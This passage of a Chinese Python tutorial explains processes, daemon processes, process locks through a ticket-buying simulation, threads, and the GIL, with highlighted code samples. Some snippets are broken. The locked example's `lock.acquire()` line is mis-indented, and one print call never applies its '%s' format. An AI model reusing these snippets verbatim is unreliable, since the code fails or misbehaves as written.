class="hljs-keyword">def</span> <span class="hljs-title function_">get_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在请求网址的数据：&#x27;</span>,url)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求结束:&#x27;</span>,url)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    start = time.time()<br>    urls = [<span class="hljs-string">&#x27;www.1.com&#x27;</span>,<span class="hljs-string">&#x27;www.2.com&#x27;</span>,<span class="hljs-string">&#x27;www.3.com&#x27;</span>]<br>    ps = [] <span class="hljs-comment">#存储创建好的多个子进程</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls: <span class="hljs-comment">#三个子进程创建且启动了，将三个子进程存储到了ps列表中</span><br>        <span class="hljs-comment">#创建了三个进程，表示三组任务</span><br>        p = Process(target=get_request,args=(url,))<br>        p.start()<br>        ps.append(p)<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> ps: <span class="hljs-comment">#主进程等待三个子进程结束后再结束</span><br>        p.join()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><p><strong>进程创建的第二种方式（继承）</strong></p><ul><li>自定义类继承Process</li><li>重写父类的run方法</li><li>在类外部调用start方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcess</span>(<span class="hljs-title class_ inherited__">Process</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-variable language_">self</span>.name = name<br>    <span class="hljs-comment">#重写父类的run方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>): <span class="hljs-comment">#该方法就是用来表示当前进程对象执行的任务</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前%s子进程正在执行&#x27;</span>,<span class="hljs-variable language_">self</span>.name)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我就是一个普通的实例方法！&#x27;</span>)<br>        <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = MyProcess(<span class="hljs-string">&#x27;bobo&#x27;</span>)<br>    p.start() <span class="hljs-comment">#启动进程，相当于是在调用对象的run方法</span><br></code></pre></td></tr></table></figure><p><a name="984e092b"></a></p><h5 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h5><p>那么如果有一天我们的需求是我的主进程结束了，由我主进程创建的那些子进程必须跟着结束，怎么办？守护进程就来了！</p><p>主进程创建守护进程后：</p><p>其一：守护进程会在主进程代码执行结束后就终止</p><p>其二：守护进程内无法再开启子进程,否则抛出异常：AssertionError: daemonic processes are not allowed to have children</p><p>语法：</p><pre><code class="hljs">子进程对象.daemon = True</code></pre><p>注意：主进程代码运行结束，守护进程随即终止</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在请求网址的数据：&#x27;</span>,url)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求结束:&#x27;</span>,url)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    start = time.time()<br>    p = Process(target=get_request,args=(<span class="hljs-string">&#x27;www.1.com&#x27;</span>,))<br>    <span class="hljs-comment"># 将当前p这个子进程设置为了守护进程</span><br>    p.daemon = <span class="hljs-literal">True</span> <span class="hljs-comment">#该操作必须放置在子进程启动操作之前</span><br>    p.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程执行结束&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a name="d0c0a409"></a></p><h4 id="进程同步-锁"><a href="#进程同步-锁" class="headerlink" title="进程同步(锁)"></a>进程同步(锁)</h4><p>通过刚刚的学习，我们千方百计实现了程序的异步，让多个任务可以同时在几个进程中并发处理，但是它们之间的运行没有顺序，一旦开启也不受我们控制。</p><p>尽管并发编程让我们能更加充分的利用计算机的资源，但是也给我们带来了新的问题：进程之间数据不共享,但是共享同一套文件系统,所以访问同一个文件是没有问题的，要是对同一文件进行读写操作呢？要知道共享带来的是竞争，竞争带来的结果就是错乱，如何控制，就是加锁处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s: %s is running&#x27;</span> %(n,os.getpid()))<br>    time.sleep(random.random())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s:%s is done&#x27;</span> %(n,os.getpid()))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        p=Process(target=work,args=(i,))<br>        p.start()<br></code></pre></td></tr></table></figure><p>通过结果可以看出两个问题：</p><pre><code class="hljs">问题一：每个进程中work函数的第一个打印不一定会是按照我们for循环的0-4的顺序来打印问题二：每个work进程中有两个打印，但是所有进程中第一个打印的顺序和第二个打印顺序完全不同且无规律，说明我们一个进程中的程序的执行顺序都混乱了。</code></pre><p>问题的解决方法，第二个问题加锁来解决，第一个问题是没有办法解决的，因为进程开到了内核，有操作系统来决定进程的调度，我们自己控制不了</p><p>加锁流程：</p><pre><code class="hljs">1.导包：from multiprocessing import Lock2.加锁：lock.acquire()3.解锁：lock.release()</code></pre><p>接下来，我们以模拟抢票为例，来看看数据安全的重要性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#在当前目录下创建一个文件（db）</span><br><span class="hljs-comment">#文件db的内容：&#123;&quot;count&quot;:1&#125;表示的是余票数量</span><br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> time,json,random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<span class="hljs-comment">#查询db文件中的余票数量</span><br>    fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./db.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    dic = json.load(fp) <span class="hljs-comment">#反序列化，将文件中的json数据转成python字典对象</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;剩余车票数量为:&#x27;</span>,dic[<span class="hljs-string">&#x27;count&#x27;</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(): <span class="hljs-comment">#负责抢票，一次只能购买一张票</span><br>    fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./db.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    dic = json.load(fp)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">if</span> dic[<span class="hljs-string">&#x27;count&#x27;</span>] &gt; <span class="hljs-number">0</span>:<span class="hljs-comment">#还有剩余车票</span><br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        dic[<span class="hljs-string">&#x27;count&#x27;</span>] -= <span class="hljs-number">1</span> <span class="hljs-comment">#一次只能购买一张票</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment">#购买车票后，余票数量发生了变化，将最新的余票数量在写回到db文件中进行存储</span><br>        json.dump(dic,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./db.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;购票成功！&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>():<br>    search() <span class="hljs-comment">#先查询</span><br>    get() <span class="hljs-comment">#后购买</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<span class="hljs-comment">#创建三个子进程</span><br>        p = Process(target=task)<br>        p.start()<br></code></pre></td></tr></table></figure><p>加锁后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> time,json,random<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Lock <span class="hljs-comment">#进程锁</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<span class="hljs-comment">#查询db文件中的余票数量</span><br>    fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./db.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    dic = json.load(fp) <span class="hljs-comment">#反序列化，将文件中的json数据转成python字典对象</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;剩余车票数量为:&#x27;</span>,dic[<span class="hljs-string">&#x27;count&#x27;</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(): <span class="hljs-comment">#负责抢票，一次只能购买一张票</span><br>    fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./db.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    dic = json.load(fp)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">if</span> dic[<span class="hljs-string">&#x27;count&#x27;</span>] &gt; <span class="hljs-number">0</span>:<span class="hljs-comment">#还有剩余车票</span><br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        dic[<span class="hljs-string">&#x27;count&#x27;</span>] -= <span class="hljs-number">1</span> <span class="hljs-comment">#一次只能购买一张票</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment">#购买车票后，余票数量发生了变化，将最新的余票数量在写回到db文件中进行存储</span><br>        json.dump(dic,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./db.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;购票成功！&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">lock</span>):<br>  lock.acquire() <span class="hljs-comment">#上锁</span><br>    search() <span class="hljs-comment">#先查询</span><br>    get() <span class="hljs-comment">#后购买</span><br>    lock.release() <span class="hljs-comment">#解锁</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    lock = Lock() <span class="hljs-comment">#创建了一把进程锁</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<span class="hljs-comment">#创建三个子进程</span><br>        p = Process(target=task,args=(lock,))<br>        p.start()<br></code></pre></td></tr></table></figure><p><a name="d276123c"></a></p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p><a name="e2d6d0e3"></a></p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>**线程：**线程是操作系统能够进行运算调度的最小单位（车间里的工人），它被包含在进程之中，线程是进程中的实际运作单位。一个进程中可以并发多个线程，每条线程并行执行不同的任务。</p><p>注意：</p><pre><code class="hljs">1.同一个进程内的多个线程是共享该进程的资源的，不同进程内的线程资源肯定是隔离的2.创建线程的开销比创建进程的开销要小的多3.每一个进程中至少会包含有一个线程，该线程叫做&quot;主线程&quot;</code></pre><p><strong>思考：多线程可以实现并行吗？</strong></p><ol><li>在CPU比较繁忙，资源不足的时候（开启了很多进程），操作系统只为一个含有多线程的进程分配仅有的CPU资源，这些线程就会为自己尽量多抢时间片，这就是通过多线程实现并发，线程之间会竞争CPU资源争取执行机会。</li><li>在CPU资源比较充足的时候，一个进程内的多线程，可以被分配到不同的CPU资源，这就是通过多线程实现并行。</li><li>至于多线程实现的是并发还是并行？上面所说，所写多线程可能被分配到一个CPU内核中执行，也可能被分配到不同CPU执行，分配过程是操作系统所为，不可人为控制。所有，如果有人问我我所写的多线程是并发还是并行的？我会说，都有可能。</li><li>不管并发还是并行，都提高了程序对CPU资源的利用率，最大限度地利用CPU资源。</li></ol><p><a name="864d351d"></a></p><h4 id="Python实现线程"><a href="#Python实现线程" class="headerlink" title="Python实现线程"></a>Python实现线程</h4><p><a name="b83fb17b"></a></p><h5 id="python线程模块的选择"><a href="#python线程模块的选择" class="headerlink" title="python线程模块的选择"></a>python线程模块的选择</h5><p>Python提供了几个用于多线程编程的模块，包括thread、threading和Queue等。thread和threading模块允许程序员创建和管理线程。thread模块提供了基本的线程和锁的支持，threading提供了更高级别、功能更强的线程管理的功能。Queue模块允许用户创建一个可以用于多个线程之间共享数据的队列数据结构。</p><p>由于更高级别的threading模块更为先进，对线程的支持更为完善，因此推荐大家使用该模块！</p><p><a name="2f8008b9"></a></p><h5 id="Threading模块"><a href="#Threading模块" class="headerlink" title="Threading模块"></a>Threading模块</h5><ul><li>我们先简单应用一下threading模块来看看并发效果：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;num的值是:&#x27;</span>,num)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#创建好了一个子线程（在主线程中创建）</span><br>    t = Thread(target=func,args=(<span class="hljs-number">1</span>,))<br>    t.start()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">num</span>):<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;num的值是:&#x27;</span>,num)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-comment">#创建好了一个子线程（在主线程中创建）</span><br>        t = Thread(target=func,args=(<span class="hljs-number">1</span>,))<br>        t.start()<br></code></pre></td></tr></table></figure><ul><li>线程的两种创建方式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前子线程正在执行&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前子线程执行结束&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    t = MyThread() <span class="hljs-comment">#创建线程对象</span><br>    t.start() <span class="hljs-comment">#启动线程对象</span><br></code></pre></td></tr></table></figure><ul><li>join()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前子线程正在执行&#x27;</span>)<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前子线程执行结束&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start = time.time()<br><br>    ts = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        t = MyThread() <span class="hljs-comment">#创建线程对象</span><br>        t.start() <span class="hljs-comment">#启动线程对象</span><br>        ts.append(t)<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> ts:<br>        t.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时:&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><ul><li>线程内存数据共享：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    <span class="hljs-keyword">global</span> n<br>    n = <span class="hljs-number">0</span> <span class="hljs-comment">#将全局变量修改为了0</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    n = <span class="hljs-number">1</span> <span class="hljs-comment">#全局变量</span><br>    t = Thread(target=work)<br>    t.start()<br>    <span class="hljs-built_in">print</span>(n) <span class="hljs-comment">#在进程中输出全局变量的值就是线程修改后的结果为0</span><br></code></pre></td></tr></table></figure><ul><li>守护线程 <ul><li>无论是进程还是线程，都遵循：守护xx会在主xx运行完毕后被销毁，不管守护xx时候被执行结束。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子线程正在执行！&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    t = Thread(target=work)<br>    t.daemon = <span class="hljs-literal">True</span> <span class="hljs-comment">#当前的子线程设置为了守护线程</span><br>    t.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主线程结束！&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多线程使用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前子线程正在执行&#x27;</span>)<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前子线程执行结束&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start = time.time()<br><br>    ts = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        t = MyThread() <span class="hljs-comment">#创建线程对象</span><br>        t.start() <span class="hljs-comment">#启动线程对象</span><br>        ts.append(t)<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> ts:<br>        t.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时:&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><p><a name="9b0dd3f4"></a></p><h4 id="线程的GIL锁（大致了解）"><a href="#线程的GIL锁（大致了解）" class="headerlink" title="线程的GIL锁（大致了解）"></a>线程的GIL锁（大致了解）</h4><p>首先，一些语言（java、c++、c）是支持同一个进程中的多个线程是可以应用多核CPU的，也就是我们会听到的现在4核8核这种多核CPU技术的厉害之处。</p><p>那么我们之前说过应用多进程的时候如果有共享数据是不是会出现数据不安全的问题啊，就是多个进程同时一个文件中去抢这个数据，大家都把这个数据改了，但是还没来得及去更新到原来的文件中，就被其他进程也计算了，导致数据不安全的问题啊，所以我们是不是通过加锁可以解决啊，多线程大家想一下是不是一样的，并发执行也会有这个数据安全的问题。如何解决呢？</p><p>但是python最早期的时候对于多线程也加锁，但是python比较极端的加了一个GIL全局解释锁，锁的是整个线程，而不是线程里面的某些数据操作，也就是说每次只能有一个线程使用cpu，也就说多线程用不了多核实现并行。</p><p>但是这个并不是python语言的问题，是CPython解释器的特性，在Cpython里面就是没办法用多核，这是python的弊病，历史问题，虽然众多python团队的大神在致力于改变这个情况，但是暂没有解决。</p><p><a name="c11c0891"></a></p><h5 id="GIL介绍"><a href="#GIL介绍" class="headerlink" title="GIL介绍"></a>GIL介绍</h5><p>在同一个进程中只有一个线程可以获取cpu的使用权限，那么其他的线程就必须等待该线程的cpu使用权消失后才能使用cpu,即使多个线程直接不会相互影响，在同一个进程下也只有一个线程使用cpu，这样的机制称为全局解释器锁（GIL）。每一个 Python 线程，在 CPython 解释器中执行时，都会先锁住自己的线程，阻止别的线程执行。</p><p>GIL的优点：</p><p>1、避免了大量的加锁解锁的繁琐操作</p><p>2、使数据更加安全，解决多线程间的数据完整性和状态同步</p><p>缺点：</p><pre><code class="hljs">多核处理器的效果退化成单核处理器，只能并发不能并行</code></pre><p><a name="134d7e99"></a></p><h5 id="GIL与多线程"><a href="#GIL与多线程" class="headerlink" title="GIL与多线程"></a>GIL与多线程</h5><p>有了GIL的存在，虽然可以保证数据的安全，但是同一时刻同一进程中只有一个线程被执行</p><p>听到这里，有的同学立马质问：进程可以利用多核，但是开销大，而python的多线程开销小，但却无法利用多核优势，也就是说python没用了，php才是最好的语言？</p><p>别着急啊，我们还没讲完：要解决这个问题，我们需要在几个点上达成一致：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span> <span class="hljs-variable">cpu</span>到底是用来做计算的，还是用来做<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>的？<br><br><span class="hljs-number">2.</span> 多<span class="hljs-variable">cpu</span>，意味着可以有多个核并行完成计算，所以多核提升的是计算性能<br><br><span class="hljs-number">3.</span> 每个<span class="hljs-variable">cpu</span>一旦遇到<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>阻塞，仍然需要等待，所以多核对<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>操作没什么用处<br></code></pre></td></tr></table></figure><p><strong>就好比是：</strong></p><pre><code 